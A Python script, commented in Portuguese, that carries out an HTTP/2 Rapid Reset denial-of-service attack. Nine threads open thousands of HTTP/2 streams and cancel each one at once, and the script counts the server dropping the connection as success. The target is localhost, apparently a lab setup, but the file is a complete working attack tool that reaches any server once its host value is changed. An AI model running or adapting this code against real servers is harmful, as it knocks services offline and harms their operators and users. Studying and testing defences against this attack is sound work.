import socket
import ssl
import time
import threading
import logging
from h2.connection import H2Connection

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(threadName)s - %(message)s')
logger = logging.getLogger(__name__)

HOST = '127.0.0.1'  
PORT = 8443
NUM_THREADS = 8
RESETS_PER_THREAD = 5000

def exploit_vulnerable_endpoint(thread_id):
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        context.set_alpn_protocols(['h2'])

        sock = socket.create_connection((HOST, PORT))
        conn = context.wrap_socket(sock, server_hostname=HOST)
        
        logger.info(f"Thread {thread_id}: Conectado via {conn.selected_alpn_protocol()}")

        h2_conn = H2Connection()
        h2_conn.initiate_connection()
        conn.sendall(h2_conn.data_to_send())
        
        time.sleep(0.1) 

        successful_attacks = 0
        
        endpoints = ['/vulnerable', '/slow', '/medium']   

        for i in range(RESETS_PER_THREAD):
            endpoint = endpoints[i % len(endpoints)]
            stream_id = (thread_id * 1000 + i) * 2 + 1
            
            try:
                headers = [
                    (':method', 'GET'),
                    (':authority', f'{HOST}:{PORT}'),
                    (':scheme', 'https'),
                    (':path', f'{endpoint}?attack=rapid-reset&thread={thread_id}&req={i}'),
                    ('user-agent', 'HTTP2-Rapid-Reset-499-Generator/1.0'),
                    ('accept', '*/*'),
                    ('cache-control', 'no-cache'),
                    ('connection', 'keep-alive'),
                ]
                
                h2_conn.send_headers(stream_id, headers, end_stream=False)
                conn.sendall(h2_conn.data_to_send())
                

                time.sleep(0.05)

                # RAPID RESET - cancela durante proxy_pass
                h2_conn.reset_stream(stream_id)
                conn.sendall(h2_conn.data_to_send())
                
                successful_attacks += 1
                
                if i % 10 == 0:
                    time.sleep(0.1)
                else:
                    time.sleep(0.01) 
                
            except ConnectionResetError:
                logger.warning(f"Thread {thread_id}: Servidor fechou conexão - sucesso!")
                break
            except Exception as e:
                logger.error(f"Thread {thread_id}: Erro no stream {stream_id}: {e}")
                break

        conn.close()
        logger.info(f"Thread {thread_id}: Finalizada - {successful_attacks} ataques enviados")
        
    except Exception as e:
        logger.error(f"Thread {thread_id}: Erro fatal: {e}")

def mass_reset_attack():
    """
    Estratégia alternativa: 
        Muitas requisições simultâneas + reset em massa
    """
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        context.set_alpn_protocols(['h2'])

        sock = socket.create_connection((HOST, PORT))
        conn = context.wrap_socket(sock, server_hostname=HOST)
        
        logger.info(f"MassAttack: Conectado via {conn.selected_alpn_protocol()}")

        h2_conn = H2Connection()
        h2_conn.initiate_connection()
        conn.sendall(h2_conn.data_to_send())
        time.sleep(0.1)

        stream_ids = []
        for i in range(5*RESETS_PER_THREAD):  
            stream_id = (9999 + i) * 2 + 1
            stream_ids.append(stream_id)
            
            headers = [
                (':method', 'GET'),
                (':authority', f'{HOST}:{PORT}'),
                (':scheme', 'https'),
                (':path', f'/?mass-attack=true&req={i}'),
                ('user-agent', 'HTTP2-Mass-Reset-Attack/1.0'),
            ]
            
            h2_conn.send_headers(stream_id, headers, end_stream=False)
            conn.sendall(h2_conn.data_to_send())
            time.sleep(0.05)
            h2_conn.reset_stream(stream_id)
            conn.sendall(h2_conn.data_to_send())
        
        logger.info(f"MassAttack: {5*RESETS_PER_THREAD} requisições enviadas, aguardando processamento...")
        conn.close()
        
    except Exception as e:
        logger.error(f"MassAttack: Erro: {e}")

def run_attack():
    print("="*73)
    print("ATAQUE HTTP/2 RAPID RESET")
    print("="*73)
    
    threads = []
    start_time = time.time()
    
    mass_thread = threading.Thread(target=mass_reset_attack, name="MassAttack")
    mass_thread.start()
    threads.append(mass_thread)
    
    time.sleep(0.5)  
    
    for i in range(NUM_THREADS):
        t = threading.Thread(target=exploit_vulnerable_endpoint, args=(i,), name=f"ExploitThread-{i}")
        t.start()
        threads.append(t)
        time.sleep(0.05)  

    for t in threads:
        t.join()

    end_time = time.time()
    duration = end_time - start_time
    
    print("\n ====>  ATAQUE CONCLUÍDO: <====")
    print(f"   Duração: {duration:.2f} segundos")
    print(f"   Threads: {NUM_THREADS + 1} (incluindo mass attack)")
    print(f"   Ataques enviados: ~{NUM_THREADS * RESETS_PER_THREAD + 5 * RESETS_PER_THREAD}")
    
    print("="*10)

if __name__ == "__main__":
    run_attack()